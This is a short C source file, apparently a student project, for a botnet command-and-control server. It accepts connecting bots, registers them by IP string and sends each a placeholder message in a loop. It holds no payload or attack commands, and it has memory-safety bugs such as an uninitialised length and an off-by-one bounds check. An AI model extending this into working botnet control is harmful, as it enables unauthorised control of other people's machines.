/*
John Carter
Server code for botnet
3/30/2021
*/

#include "server.h"

pthread_mutex_t chatMutex = PTHREAD_MUTEX_INITIALIZER;
static  bot_t bots[MAXBOTS];

int claim_port(const char *port) {
    struct addrinfo    addrinfo;
    struct addrinfo    *result;
    int                sd;
    char               message[256];
    int                on = 1;
    
    addrinfo.ai_flags = AI_PASSIVE;
    addrinfo.ai_family = AF_INET;
    addrinfo.ai_socktype = SOCK_STREAM;
    addrinfo.ai_protocol = 0;
    addrinfo.ai_canonname = NULL;
    addrinfo.ai_addrlen = 0;
    addrinfo.ai_addr = NULL;
    addrinfo.ai_canonname = NULL;
    addrinfo.ai_next = NULL;

    if ( getaddrinfo( 0, port, &addrinfo, &result ) != 0 ) {
        fprintf( stderr, "\x1b[1;31mgetaddrinfo( %s ) failed errno is %s\x1b[0m\n", port, strerror( errno ));
        return -1;
    } else if ( errno = 0, (sd = socket( result->ai_family, result->ai_socktype, result->ai_protocol )) == -1 ) {
        write( 1, message, sprintf( message, "socket() failed.\n") );
        freeaddrinfo( result );
        return -1;
    } else if ( setsockopt( sd, SOL_SOCKET, SO_REUSEADDR, &on, sizeof(on) ) == -1 ) {
        write( 1, message, sprintf( message, "setsockopt() failed.\n") );
        freeaddrinfo( result );
        close( sd );
        return -1;
    } else if ( bind( sd, result->ai_addr, result->ai_addrlen ) == -1 ) {
        freeaddrinfo( result );
        close( sd );
        write( 1, message, sprintf( message, "\x1b[2;33mBinding to port %s ...\x1b[0m\n", port ) );
        return -1;
    } else if ( listen( sd, 100 ) == -1 ) {
        printf( "listen() failed in file %s line %d\n", __FILE__, __LINE__ );
        close( sd );
        return 0;
    } else {
        write( 1, message, sprintf( message,  "\x1b[1;32mSUCCESS: Bind to port %s\x1b[0m\n", port ) );
        freeaddrinfo( result );
        return sd;
    }
}

int main(int argc, char **argv) {
    int                   ignore;
    int                   sd;
    char                  message[256];
    
    if ( argc < 2 ) {
        fprintf( stderr, "\x1b[1;31mMust specify port number on command line\x1b[0m\n");
        exit( 1 );
    } else if ( sscanf( argv[1], "%d", &ignore ) == 0 ) {
        fprintf( stderr, "\x1b[1;31mMust specify port number as integer on command line\x1b[0m\n");
        exit( 1 );
    } else if ( (sd = claim_port( argv[1] )) == -1 ) {
        write( 1, message, sprintf( message,  "\x1b[1;31mCould not bind to port %s. Reason: %s\x1b[0m\n", argv[1], strerror( errno ) ) );
        return 1;
    } else {
        pthread_t sessionAcceptorThread;
        pthread_create(&sessionAcceptorThread, NULL, sessionAcceptor, &sd);
        pthread_join(sessionAcceptorThread, NULL);

        close( sd );
        return 0;
    }
}

void *sessionAcceptor(void *vargp) {
    /*
    Accept new bots wanting to connect to C&C server
    */
    char                    errorMessage[100];
    char                    username[100];
    char                    returnmessage[1000];
    int                     fd;
    int                     br;
    int                     sd = *((int *) vargp);
    int                     i = 0;
    socklen_t               ic;
    struct sockaddr_in      senderAddr;
    pthread_t               botServiceThread;
    
    // Initialize the bots
    for (i = 0; i < MAXBOTS; i++) {
        bots[i].fd = -1;
        bots[i].username[0] = '\0';
    }
    
    while ((fd = accept(sd, (struct sockaddr *)&senderAddr, &ic )) != -1) {
        i = 0;
        while ((bots[i].fd != -1) && (i <= MAXBOTS)) {
            i++;
        }

        // Check to make sure we don't exceed max number of bots,
        // and that no IP is duplicated (it shouldn't be)
        if (i >= MAXBOTS) {
            sprintf(errorMessage, "ERROR: %d bots already activated. Cannot create another!\n", MAXBOTS);
            write(fd, errorMessage, strlen(errorMessage));
            close(fd);
        } else {
            br = read(fd, username, sizeof(username) - 1);
            username[br] = '\0';
            printf("IP: %s/fd: %d\n", username, fd);

            i = 0;
            while ((bots[i].username[0] != '\0') && (strcmp(username, bots[i].username) != 0)) {
                i++;
            }

            // IP is already connected to server, so there's a mistake...
            if (strcmp(username, bots[i].username) == 0) {
                sprintf(returnmessage, "\x1b[1;31mIP \x1b[1;34m%s\x1b[0m \x1b[1;31malready activated!\x1b[0m\n", username);
                write(fd, returnmessage, strlen(returnmessage));
                close(fd);
            } else {
                // IP is valid, so spawn a new thread to handle it
                strcpy(bots[i].username, username);
                bots[i].fd = fd;
                bots[i].botID = i;
                pthread_create(&botServiceThread, NULL, botService, &(bots[i]));
            }
        }
    }
    return NULL;
}

void *botService(void *vargp) {
    /*
    Handle commands for each specific bot
    */
    bot_t *user = (bot_t *)vargp;

    while (1) {
        write(user->fd, "john", sizeof("john"));
        sleep(2);
    }
    
    return NULL;
}